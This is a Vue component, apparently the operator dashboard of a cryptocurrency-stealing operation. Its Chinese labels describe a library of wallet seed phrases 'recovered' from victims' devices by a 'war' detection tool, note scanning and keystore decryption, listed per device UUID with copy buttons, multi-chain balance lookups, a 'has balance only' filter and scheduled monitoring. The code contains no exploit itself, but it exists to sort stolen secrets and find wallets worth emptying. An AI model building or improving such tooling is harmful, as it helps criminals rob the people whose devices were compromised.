<script setup lang="ts">
import { onMounted, ref } from 'vue'
import { panelApi } from '@/api/panel'
import type { RecoveredWordRow } from '@/api/types'
import EmptyState from '@/components/EmptyState.vue'
import { tsShort } from '@/utils/format'
import { ElMessage } from 'element-plus'

/**
 * 助记词库：解析/还原出来的助记词（war 工具检测 + 备忘录） + 多链余额缓存。
 * - 助记词默认折叠（不占地方），点击展开/收起；
 * - 币种 与 余额(USD) 分列；时间靠后；
 * - 「监控」= 触发该条后台重查；「查余额」= 实时查询（弹窗明细）；
 * - 后台可设自动查询间隔（分钟）。
 */
const rows = ref<RecoveredWordRow[]>([])
const total = ref(0)
const page = ref(1)
const per = ref(50)
const kw = ref('')
const onlyValid = ref(false)
const loading = ref(false)
const stats = ref<{ total?: number; valid?: number }>({})
const intervalMin = ref(5)
const expanded = ref<Record<number, boolean>>({})

async function load() {
  loading.value = true
  try {
    const r = await panelApi.words(page.value, per.value, onlyValid.value, kw.value.trim())
    rows.value = r?.rows ?? []
    total.value = Number(r?.total ?? 0)
    if (r?.stats) stats.value = r.stats
  } catch {
    rows.value = []
    total.value = 0
  } finally {
    loading.value = false
  }
}
async function loadConfig() {
  try {
    const c = await panelApi.wordsConfig()
    if (c?.interval_min) intervalMin.value = c.interval_min
  } catch {
    /* ignore */
  }
}
async function saveConfig() {
  try {
    const c = await panelApi.wordsSetConfig(intervalMin.value)
    intervalMin.value = c?.interval_min ?? intervalMin.value
    ElMessage.success(`自动查询间隔已设为 ${intervalMin.value} 分钟`)
  } catch {
    ElMessage.error('保存失败')
  }
}

function search() {
  page.value = 1
  void load()
}
function onPage(p: number) {
  page.value = p
  void load()
}
function onSize(s: number) {
  per.value = s
  page.value = 1
  void load()
}

function shortPhrase(row: RecoveredWordRow): string {
  const ws = String(row.phrase || '').split(/\s+/)
  if (ws.length <= 6) return row.phrase || ''
  return ws.slice(0, 3).join(' ') + ' … ' + ws.slice(-3).join(' ')
}
/** 币种摘要 → chips（最多显示 3 个）。 */
function sumChips(row: RecoveredWordRow): string[] {
  return String(row.balance_summary || '')
    .split('·')
    .map((s) => s.trim())
    .filter(Boolean)
}
/** 来源短标签（避免过长）。 */
function sourceLabel(row: RecoveredWordRow): string {
  const s = String(row.wallet || row.crosscheck || row.source || '-')
  if (s === 'keystore 解密') return 'keystore'
  return s
}
function toggle(row: RecoveredWordRow) {
  const id = row.id ?? 0
  expanded.value[id] = !expanded.value[id]
}
async function copy(phrase?: string) {
  if (!phrase) return
  try {
    await navigator.clipboard.writeText(phrase)
    ElMessage.success('已复制')
  } catch {
    /* ignore */
  }
}

// ── 明细（缓存 / 实时）──
type Rep = Record<string, any>
const balDialog = ref(false)
const balLoading = ref(false)
const balJob = ref<Rep | null>(null)
const balPhrase = ref('')

async function openCached(row: RecoveredWordRow) {
  balPhrase.value = row.phrase || ''
  balJob.value = null
  balDialog.value = true
  balLoading.value = true
  try {
    const d = await panelApi.wordsDetail(row.id!)
    if (d?.balance_json) balJob.value = JSON.parse(d.balance_json)
  } catch {
    /* ignore */
  } finally {
    balLoading.value = false
  }
}
async function queryBalance(row: RecoveredWordRow) {
  if (!row.phrase) return
  balPhrase.value = row.phrase
  balJob.value = null
  balDialog.value = true
  balLoading.value = true
  try {
    const r = await panelApi.wordsBalance([row.phrase], true, true)
    const job = r?.job
    if (!job) {
      ElMessage.error('创建查询任务失败（chainquery 未启动？）')
      return
    }
    for (let i = 0; i < 160; i++) {
      await new Promise((res) => setTimeout(res, 1500))
      const j = await panelApi.wordsBalanceJob(job)
      balJob.value = j as Rep
      if ((j as Rep)?.status === 'done') break
    }
  } catch {
    ElMessage.error('查询失败（chainquery 不可达？）')
  } finally {
    balLoading.value = false
  }
}
async function monitor(row: RecoveredWordRow) {
  const on = !row.monitored
  try {
    await panelApi.wordsMonitor(row.id ?? 0, on)
    ElMessage.success(on ? '已开启监控（后台自动查询/周期刷新）' : '已关闭监控')
    await load()
  } catch {
    ElMessage.error('操作失败')
  }
}
async function rebalanceAll() {
  try {
    await panelApi.wordsRebalance(0, true)
    ElMessage.info('已触发全部余额重查（后台进行）')
    await load()
  } catch {
    ElMessage.error('触发失败')
  }
}

function balResults(): Rep[] {
  const j = balJob.value
  return Array.isArray(j?.results) ? (j!.results as Rep[]) : []
}
function asRows(x: unknown): Rep[] {
  return Array.isArray(x) ? (x as Rep[]) : []
}
async function copyAddr(a?: string) {
  if (!a) return
  try {
    await navigator.clipboard.writeText(a)
    ElMessage.success('地址已复制')
  } catch {
    /* ignore */
  }
}
onMounted(() => {
  void load()
  void loadConfig()
})
</script>

<template>
  <section class="app-card">
    <div class="app-card__head">
      <h3 class="app-card__title">
        <el-icon><Key /></el-icon>助记词库
        <span class="chip">{{ stats.total ?? total }} 条</span>
      </h3>
      <div class="row row--wrap">
        <span class="t-3" style="font-size: var(--fs-xs)">自动查询</span>
        <el-input-number v-model="intervalMin" :min="1" :max="1440" size="small" style="width: 120px" />
        <span class="t-3" style="font-size: var(--fs-xs)">分钟</span>
        <el-button size="small" @click="saveConfig">保存</el-button>
        <el-checkbox v-model="onlyValid" size="small" @change="search">仅有余额</el-checkbox>
        <el-input v-model="kw" size="small" placeholder="搜索助记词 / 设备" clearable style="width: 200px"
          @keyup.enter="search" @clear="search" />
        <el-button size="small" type="primary" @click="search">搜索</el-button>
        <el-button size="small" :loading="loading" @click="load">刷新</el-button>
        <el-button size="small" @click="rebalanceAll">全部重查</el-button>
      </div>
    </div>

    <div class="app-card__body app-card__body--flush">
      <el-table :data="rows" size="small" height="calc(100vh - 300px)" empty-text="…" class="wtable">
        <el-table-column prop="uuid" label="设备" width="150" show-overflow-tooltip>
          <template #default="{ row }"><span class="mono t-3">{{ row.uuid || '-' }}</span></template>
        </el-table-column>

        <el-table-column label="助记词" min-width="240">
          <template #default="{ row }">
            <div class="phr">
              <span class="phr__txt mono" :class="{ 'is-open': expanded[row.id] }" :title="row.phrase"
                @click="toggle(row)">
                {{ expanded[row.id] ? row.phrase : shortPhrase(row) }}
              </span>
              <span class="phr__copy" title="复制助记词" @click.stop="copy(row.phrase)">📋</span>
            </div>
          </template>
        </el-table-column>

        <el-table-column label="词数" prop="words" width="58" align="center" />

        <el-table-column label="币种" min-width="190">
          <template #default="{ row }">
            <div v-if="sumChips(row).length" class="coins">
              <span v-for="c in sumChips(row).slice(0, 3)" :key="c" class="coin">{{ c }}</span>
              <span v-if="sumChips(row).length > 3" class="coin coin--more" :title="row.balance_summary">
                +{{ sumChips(row).length - 3 }}
              </span>
            </div>
            <span v-else class="dash">—</span>
          </template>
        </el-table-column>

        <el-table-column label="余额(USD)" width="108" align="right">
          <template #default="{ row }">
            <el-button v-if="row.has_balance" link size="small" :type="row.balance_usd ? 'success' : 'default'"
              @click="openCached(row)">${{ (row.balance_usd ?? 0).toFixed(2) }}</el-button>
            <span v-else-if="row.monitored" class="dash pending">查询中…</span>
            <span v-else class="dash">未监控</span>
          </template>
        </el-table-column>

        <el-table-column label="来源" width="104">
          <template #default="{ row }">
            <span class="tag">{{ sourceLabel(row) }}</span>
          </template>
        </el-table-column>

        <el-table-column label="操作" width="130" fixed="right">
          <template #default="{ row }">
            <el-button class="act" link size="small" :type="row.monitored ? 'success' : 'primary'" @click="monitor(row)">
              {{ row.monitored ? '监控中' : '监控' }}
            </el-button>
            <el-button class="act" link size="small" @click="queryBalance(row)">查余额</el-button>
          </template>
        </el-table-column>

        <el-table-column label="时间" width="140">
          <template #default="{ row }"><span class="mono t-3">{{ tsShort(row.created_ts) }}</span></template>
        </el-table-column>

        <template #empty><EmptyState text="暂无还原出的助记词（等 war 检测 / 备忘录扫描）" /></template>
      </el-table>
    </div>

    <div class="pager">
      <el-pagination background layout="total, sizes, prev, pager, next, jumper" :total="total"
        :current-page="page" :page-size="per" :page-sizes="[20, 50, 100, 200]" @current-change="onPage"
        @size-change="onSize" />
    </div>

    <el-dialog v-model="balDialog" title="多链余额" width="780px" top="6vh">
      <div class="bal">
        <div class="mono t-3" style="font-size: var(--fs-xs); word-break: break-all">{{ balPhrase }}</div>
        <div v-if="balLoading && !balResults().length" class="t-3" style="padding: 12px 0">查询中…</div>
        <div v-for="(r, i) in balResults()" :key="i" class="bal__block">
          <div class="bal__head">
            <b>{{ r.label || '结果' }}</b>
            <span v-if="r.total_usd" class="chip chip--ok">≈ ${{ r.total_usd }}</span>
            <span v-if="r.error" class="chip chip--warn">{{ r.error }}</span>
          </div>
          <el-table :data="asRows(r.rows)" size="small" empty-text="无原生币余额">
            <el-table-column prop="chain" label="币种" width="80" />
            <el-table-column label="地址" min-width="240">
              <template #default="{ row }">
                <span class="mono addr" title="点击复制" @click="copyAddr(row.address)">{{ row.address }}</span>
              </template>
            </el-table-column>
            <el-table-column prop="amount" label="数量" width="150" />
            <el-table-column label="$" width="90">
              <template #default="{ row }">{{ row.usd ?? '-' }}</template>
            </el-table-column>
          </el-table>
          <el-table v-if="asRows(r.tokens).length" :data="asRows(r.tokens)" size="small">
            <el-table-column prop="chain" label="链" width="80" />
            <el-table-column prop="symbol" label="代币" width="110" />
            <el-table-column prop="amount" label="数量" width="150" />
            <el-table-column label="$" width="90">
              <template #default="{ row }">{{ row.usd ?? '-' }}</template>
            </el-table-column>
          </el-table>
        </div>
      </div>
    </el-dialog>
  </section>
</template>

<style scoped>
.wtable :deep(.el-table__cell) {
  padding: 6px 0;
}
.wtable :deep(.cell) {
  white-space: nowrap;
  overflow: hidden;
}

.phr {
  display: flex;
  align-items: center;
  gap: 6px;
  min-width: 0;
}
.phr__txt {
  flex: 1;
  min-width: 0;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  color: var(--text-2);
  cursor: pointer;
}
.phr__txt:hover {
  color: var(--brand-2);
}
.phr__txt.is-open {
  white-space: normal;
  word-break: break-all;
  color: var(--text-1);
}
.phr__copy {
  flex: none;
  cursor: pointer;
  font-size: 13px;
  opacity: 0.5;
  transition: opacity var(--dur-fast) var(--ease);
}
.phr__copy:hover {
  opacity: 1;
}
.act {
  flex: none;
}

.badge {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 20px;
  height: 20px;
  border-radius: 50%;
  font-size: 12px;
  font-weight: 600;
}
.badge--ok {
  color: #34d399;
  background: rgba(52, 211, 153, 0.14);
}
.badge--warn {
  color: #f59e0b;
  background: rgba(245, 158, 11, 0.14);
}

.coins {
  display: flex;
  align-items: center;
  gap: 4px;
  overflow: hidden;
}
.coin {
  flex: none;
  padding: 0 7px;
  height: 20px;
  line-height: 20px;
  border-radius: 10px;
  font-size: 11px;
  color: var(--text-2);
  background: var(--bg-hover);
  border: 1px solid var(--border);
  font-family: var(--font-mono);
}
.coin--more {
  color: var(--brand-2);
  border-color: var(--border-glow);
}

.dash {
  color: var(--text-3);
  font-size: var(--fs-xs);
}
.pending {
  opacity: 0.7;
}

.tag {
  display: inline-block;
  padding: 1px 8px;
  border-radius: 10px;
  font-size: 11px;
  color: #a78bfa;
  background: rgba(167, 139, 250, 0.13);
  border: 1px solid rgba(167, 139, 250, 0.32);
}

.pager {
  display: flex;
  justify-content: flex-end;
  padding: var(--sp-3) var(--sp-4);
}
.bal {
  display: flex;
  flex-direction: column;
  gap: var(--sp-3);
}
.bal__block {
  display: flex;
  flex-direction: column;
  gap: 6px;
}
.bal__head {
  display: flex;
  align-items: center;
  gap: 8px;
}
.addr {
  cursor: pointer;
}
.addr:hover {
  text-decoration: underline;
  color: var(--brand-2);
}
</style>
